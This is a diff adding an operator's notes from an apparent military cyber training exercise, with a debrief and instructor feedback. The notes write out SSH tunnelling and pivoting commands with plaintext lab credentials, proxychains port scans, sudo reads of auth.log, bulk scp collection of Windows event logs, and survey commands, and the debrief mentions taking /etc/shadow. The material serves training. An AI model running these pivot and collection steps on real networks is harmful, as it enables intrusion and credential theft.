@@ -1,0 +1,145 @@
+Scheme of Maneuver:
+> T1: 10.50.27.188
+-> T2: 10.145.117.11
+--> T3: 10.145.117.15
+---> T4: 192.168.117.104
+----> T5: 192.168.117.105
+----> T6: 192.168.117.106
+----> T7: 192.168.117.107
+
+
+T1 >>Entry Router<<
+Hostname: EXT_RTR
+IP: 10.50.27.188 // 10.145.117.86
+ssh -MS /tmp/T1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@10.50.27.188 -p 22011
+password4
+
+Action: Perform SSH masquerade and redirect to the next target.
+
+
+T2
+Hostname: SERVER1
+IP: 10.145.117.11
+ssh -S /tmp/T1 bad -O forward -L 2222:10.145.117.11:22012
+ssh -MS /tmp/T2 -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+password4
+
+Action: Perform SSH masquerade and redirect to the next target.
+
+
+T3
+Hostname: Unknown
+IP: 10.145.117.15 // 192.168.117.98
+ssh -S /tmp/T2 bad -O forward -L 3333:10.145.117.15:22012
+ssh -MS /tmp/T3 -p 3333 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+password4
+Action: Perform SSH masquerade and redirect to the next target. Conduct port scans to find ssh ports for the 192.168.117.0/24 network. Port scans must be 1000 ports or less to minimize network traffic and are suspected to be within the 22000-22999 range.
+ssh -S /tmp/T3 bad -O forward -D 9050
+proxychains nmap -Pn -sT 192.168.117.104 -p22000-22999 -T4 | grep open
+proxychains nmap -Pn -sT 192.168.117.0-255 -p22013 -T4 | grep open
+
+T4
+Hostname: TARGET4
+IP: 192.168.117.104
+ssh -S /tmp/T3 bad -O forward -L 4444:192.168.117.104:22013
+ssh -MS /tmp/T4 -p 4444 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+password4
+Action: Perform SSH masquerade and conduct analyst survey. Identify and inform Analyst of target potential for follow-on operational value. Collect files of interest. Maneuver to the next target.
+
+ssh -S /tmp/T4 student4@localhost -p 4444 -t "sudo cat /var/log/auth.log" > auth.log
+password4
+ssh -S /tmp/T4 student4@localhost -p 4444 -t "cat /Reptile/Kconfig" > Kconfig_Reptile
+
+---> T4: 192.168.117.104
+----> T5: 192.168.117.105
+----> T6: 192.168.117.106
+----> T7: 192.168.117.107
+
+T5
+Hostname: TARGET5
+IP: 192.168.117.105
+OS: Windows v. unknown
+ssh -S /tmp/T4 bad -O forward -L 5555:192.168.117.105:22013
+ssh -MS /tmp/T5 -p 5555 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+password4
+Action: Perform SSH masquerade and conduct analyst survey. Identify and inform Analyst of target potential for follow-on operational value. Collect files of interest. Maneuver to the next target.
+
+ssh -S /tmp/T5 bad 'wmic service list full' >> Survey_192.168.117.105
+scp -o ControlPath=/tmp/T5 -P 5555 -r student4@localhost:c:/windows/system32/winevt/logs/Microsoft-Windows-CloudStore%4Operational.evtx . 
+scp -o ControlPath=/tmp/T5 -P 5555 -r student4@localhost:c:/windows/system32/winevt/logs/Application.evtx . 
+scp -o ControlPath=/tmp/T5 -P 5555 -r student4@localhost:c:/windows/system32/winevt/logs/System.evtx .
+scp -o ControlPath=/tmp/T5 -P 5555 -r student4@localhost:c:/windows/system32/winevt/logs/Security.evtx .
+scp -o ControlPath=/tmp/T5 -P 5555 -r student4@localhost:c:/windows/system32/winevt/logs/Microsoft-Windows-Crypto-DPAPI%4Operational.evtx .
+scp -o ControlPath=/tmp/T5 -P 5555 -r student4@localhost:c:/windows/system32/winevt/logs/OpenSSH%4Admin.evtx .
+scp -o ControlPath=/tmp/T5 -P 5555 -r student4@localhost:c:/windows/system32/winevt/logs/Microsoft-Windows-CoreSystem-SmsRouter-Events%4Operational.evtx .
+scp -o ControlPath=/tmp/T5 -P 5555 -r student4@localhost:c:/windows/system32/winevt/logs/Microsoft-Windows-DeviceManagement-Enterprise-Diagnostics-Provider%4Operational.evtx .
+scp -o ControlPath=/tmp/T5 -P 5555 -r student4@localhost:c:/windows/system32/winevt/logs/Microsoft-Windows-Diagnosis-Scripted%4Admin.evtx .
+scp -o ControlPath=/tmp/T5 -P 5555 -r student4@localhost:c:/windows/system32/winevt/logs/Microsoft-Windows-DeviceSetupManager%4Operational.evtx .
+scp -o ControlPath=/tmp/T5 -P 5555 -r student4@localhost:c:/windows/system32/winevt/logs/Microsoft-Windows-Diagnosis-Scripted%4Operational.evtx .
+scp -o ControlPath=/tmp/T5 -P 5555 -r student4@localhost:c:/windows/system32/winevt/logs/Microsoft-Windows-Diagnosis-Scheduled%4Operational.evtx .
+scp -o ControlPath=/tmp/T5 -P 5555 -r student4@localhost:c:/windows/system32/winevt/logs/Microsoft-Windows-DeviceSetupManager%4Admin.evtx .
+scp -o ControlPath=/tmp/T5 -P 5555 -r student4@localhost:c:/windows/system32/winevt/logs/Microsoft-Windows-Provisioning-Diagnostics-Provider%4Admin.evtx .
+scp -o ControlPath=/tmp/T5 -P 5555 -T 'student4@localhost:"C:/windows/system32/winevt/logs/Windows PowerShell.evtx"' .
+scp -o ControlPath=/tmp/T5 -P 5555 -T 'student4@localhost:"c:/windows/system32/winevt/logs/Microsoft-Windows-User Profile Service%4Operational.evtx"' .
+scp -o ControlPath=/tmp/T5 -P 5555 -r student4@localhost:c:/windows/system32/winevt/logs/Microsoft-Windows-LiveId%4Operational.evtx .
+scp -o ControlPath=/tmp/T5 -P 5555 -r student4@localhost:c:/windows/system32/winevt/logs/Microsoft-Windows-Diagnosis-DPS%4Operational.evtx .
+scp -o ControlPath=/tmp/T5 -P 5555 -r student4@localhost:c:/windows/system32/winevt/logs/Microsoft-Windows-GroupPolicy%4Operational.evtx .
+scp -o ControlPath=/tmp/T5 -P 5555 -r student4@localhost:c:/windows/system32/winevt/logs/Microsoft-Windows-Storage-Storport%4Operational.evtx .
+
+#####Disconnect from T5 first####
+
+T6
+Hostname: USER6
+IP: 192.168.117.106
+ssh -S /tmp/T4 bad -O forward -L 6666:192.168.117.106:22013
+ssh -MS /tmp/T6 -p 6666 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+password4
+
+Action: Perform SSH masquerade and conduct analyst survey. Identify and inform Analyst of target potential for follow-on operational value. Collect files of interest. Maneuver to the next target.
+
+#####Disconnect from T6 first####
+
+T7
+Hostname: USER7
+OS: Windows v. unknown
+IP: 192.168.117.107
+ssh -S /tmp/T4 bad -O forward -L 7777:192.168.117.107:22013
+ssh -MS /tmp/T7 -p 7777 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+password4
+
+Action: Perform SSH masquerade and conduct analyst survey. Identify and inform Analyst of target potential for follow-on operational value. Collect files of interest. Conclude operation.
+
+ssh -S /tmp/T7 bad 'driverquery /v' >> Survey_192.168.117.107
+
+ssh -S /tmp/T7 bad 'wmic service list full' >> Survey_192.168.117.107
+#####Disconnect from T7####
+
+
+DEBRIEF!!!
+
+
+
+
+DEBRIEF 
+
+Operator:1LT An
+
+Operation: DRYRUN02
+
+MC: mc2
+
+Analyst: analyst1, analyst2
+
+Description: DRYRUN02 is a C-ISR mission to perform survey and collection off targets of interest. On T1, we redirected to the 10.145.117.0/24 network and got to T2. On T2, we redirected to the 192.168.117.0/24 network onto T3. On T3, we performed some scan which was redundant to DRYRUN01. On T4, we used this target as the pivot for T5, T6, and T7. We collected auth.log and exploitation tool config file from T4. On T5, we performed survey and collected Windows event log files (.evt). On T6, we peformed survey and collected /etc/passwd and /etc/shadow. On T7, we also performed survey and collected the Spyrix installation file called sfk.exe. The collected information will be used to conduct FUOP in this network.
+
+
+Violations:
+collected a directory over 100MB without checking size first
+one time forgot to tell EA survey complete, and started collection
+wrong MC on DEBRIEF
+
+
+Okay Sir, so a couple of things other than those. There was some missed communications with the analyst, such as sending them the hashes as well as having BOTH the remote and local hashes in your opnotes. Also missing some time stamps in your op notes. Gotta have mission start & end time, as well as the vetting times after your connect times.
+
+
+
